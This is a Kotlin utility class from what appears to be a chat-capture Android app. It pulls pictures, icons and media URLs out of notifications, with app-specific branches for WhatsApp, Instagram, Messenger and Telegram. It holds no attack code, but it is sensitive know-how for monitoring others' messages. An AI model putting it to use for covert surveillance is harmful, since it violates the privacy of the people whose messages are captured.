package com.chats.capture.utils

import android.app.Notification
import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.service.notification.StatusBarNotification
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import timber.log.Timber
import java.io.File
import java.io.FileOutputStream
import java.io.IOException

class MediaExtractor(private val context: Context) {
    
    suspend fun extractMediaFromNotification(
        sbn: StatusBarNotification
    ): List<String>? = withContext(Dispatchers.IO) {
        val notification = sbn.notification
        val mediaSources = mutableListOf<String>()
        
        try {
            // Method 1: Notification Extras (bitmaps, icons)
            extractFromExtras(notification)?.let { mediaSources.addAll(it) }
            
            // Method 2: Content URI
            if (mediaSources.isEmpty()) {
                extractFromContentUri(notification)?.let { mediaSources.addAll(it) }
            }
            
            // Method 3: RemoteViews
            if (mediaSources.isEmpty()) {
                extractFromRemoteViews(notification)?.let { mediaSources.addAll(it) }
            }
            
            // Method 4: App-specific extraction (URLs)
            extractAppSpecific(sbn.packageName, notification)?.let { mediaSources.addAll(it) }
            
            // Method 5: Check for media session (for audio/video)
            extractFromMediaSession(notification)?.let { mediaSources.addAll(it) }
            
            if (mediaSources.isNotEmpty()) {
                Timber.d("Extracted ${mediaSources.size} media sources from notification: ${mediaSources.joinToString(", ")}")
                return@withContext mediaSources
            }
        } catch (e: Exception) {
            Timber.e(e, "Error extracting media from notification")
        }
        
        return@withContext null
    }
    
    private fun extractFromExtras(notification: Notification): List<String>? {
        val extras = notification.extras ?: return null
        val mediaUrls = mutableListOf<String>()
        
        // Check for picture
        val picture = extras.getParcelable<Bitmap>(Notification.EXTRA_PICTURE)
        picture?.let {
            val file = saveBitmapToFile(it, "picture")
            file?.let { mediaUrls.add(it) }
        }
        
        // Check for large icon
        val largeIcon = extras.getParcelable<android.graphics.drawable.Icon>(Notification.EXTRA_LARGE_ICON)
        largeIcon?.let {
            try {
                val bitmap = it.loadDrawable(context)?.toBitmap()
                bitmap?.let {
                    val file = saveBitmapToFile(it, "icon")
                    file?.let { mediaUrls.add(file) }
                }
            } catch (e: Exception) {
                Timber.e(e, "Error extracting large icon")
            }
        }
        
        // Check for custom extras
        val customKeys = extras.keySet()
        for (key in customKeys) {
            val value = extras.get(key)
            when {
                value is String && isMediaUrl(value) -> mediaUrls.add(value)
                key.contains("image", ignoreCase = true) && value is String -> {
                    if (isMediaUrl(value)) mediaUrls.add(value)
                }
                key.contains("media", ignoreCase = true) && value is String -> {
                    if (isMediaUrl(value)) mediaUrls.add(value)
                }
                key.contains("picture", ignoreCase = true) && value is String -> {
                    if (isMediaUrl(value)) mediaUrls.add(value)
                }
            }
        }
        
        return if (mediaUrls.isNotEmpty()) mediaUrls else null
    }
    
    private fun extractFromContentUri(notification: Notification): List<String>? {
        val extras = notification.extras ?: return null
        val mediaSources = mutableListOf<String>()
        
        // Check for content URIs
        val contentUri = extras.getParcelable<android.net.Uri>("android.contentUri")
        contentUri?.let {
            mediaSources.add(it.toString())
        }
        
        // Check for various URI keys
        val uriKeys = listOf("content_uri", "media_uri", "image_uri", "video_uri", "audio_uri")
        for (key in uriKeys) {
            extras.getString(key)?.let {
                if (isMediaUrl(it)) {
                    mediaSources.add(it)
                }
            }
        }
        
        return if (mediaSources.isNotEmpty()) mediaSources else null
    }
    
    private fun extractFromMediaSession(notification: Notification): List<String>? {
        val extras = notification.extras ?: return null
        val mediaSources = mutableListOf<String>()
        
        // Check for media session metadata (for audio/video)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val mediaSession = extras.getParcelable<android.media.session.MediaSession.Token>("android.mediaSession")
            mediaSession?.let {
                // Media session might contain metadata with media URLs
                // This is app-specific and may require additional extraction
            }
        }
        
        // Check for media metadata
        extras.getString("android.media.metadata.ART_URI")?.let {
            if (isMediaUrl(it)) mediaSources.add(it)
        }
        extras.getString("android.media.metadata.ALBUM_ART_URI")?.let {
            if (isMediaUrl(it)) mediaSources.add(it)
        }
        extras.getString("android.media.metadata.DISPLAY_ICON_URI")?.let {
            if (isMediaUrl(it)) mediaSources.add(it)
        }
        
        return if (mediaSources.isNotEmpty()) mediaSources else null
    }
    
    private fun extractFromRemoteViews(notification: Notification): List<String>? {
        // RemoteViews extraction is complex and may not always work
        // This is a placeholder for future implementation
        return null
    }
    
    private fun extractAppSpecific(packageName: String, notification: Notification): List<String>? {
        val extras = notification.extras ?: return null
        val mediaUrls = mutableListOf<String>()
        
        when (packageName) {
            "com.whatsapp" -> {
                // WhatsApp specific extraction
                extras.getString("android.mediaSession")?.let {
                    if (isMediaUrl(it)) mediaUrls.add(it)
                }
            }
            "com.instagram.android" -> {
                // Instagram specific extraction
                extras.getString("image_url")?.let {
                    if (isMediaUrl(it)) mediaUrls.add(it)
                }
            }
            "com.facebook.katana", "com.facebook.orca" -> {
                // Facebook/Messenger specific extraction
                extras.getString("media_url")?.let {
                    if (isMediaUrl(it)) mediaUrls.add(it)
                }
            }
            "org.telegram.messenger" -> {
                // Telegram specific extraction
                extras.getString("photo_url")?.let {
                    if (isMediaUrl(it)) mediaUrls.add(it)
                }
            }
        }
        
        return if (mediaUrls.isNotEmpty()) mediaUrls else null
    }
    
    private fun saveBitmapToFile(bitmap: Bitmap, prefix: String): String? {
        return try {
            val dir = File(context.getExternalFilesDir(null), "temp_media")
            if (!dir.exists()) dir.mkdirs()
            
            val file = File(dir, "${prefix}_${System.currentTimeMillis()}.png")
            FileOutputStream(file).use { out ->
                bitmap.compress(Bitmap.CompressFormat.PNG, 90, out)
            }
            file.absolutePath
        } catch (e: IOException) {
            Timber.e(e, "Error saving bitmap to file")
            null
        }
    }
    
    private fun android.graphics.drawable.Drawable.toBitmap(): Bitmap? {
        return if (this is android.graphics.drawable.BitmapDrawable) {
            this.bitmap
        } else {
            val bitmap = Bitmap.createBitmap(
                intrinsicWidth.coerceAtLeast(1),
                intrinsicHeight.coerceAtLeast(1),
                Bitmap.Config.ARGB_8888
            )
            val canvas = android.graphics.Canvas(bitmap)
            setBounds(0, 0, canvas.width, canvas.height)
            draw(canvas)
            bitmap
        }
    }
    
    private fun isMediaUrl(url: String): Boolean {
        return url.startsWith("http://") || url.startsWith("https://") ||
                url.startsWith("content://") || url.startsWith("file://")
    }
}
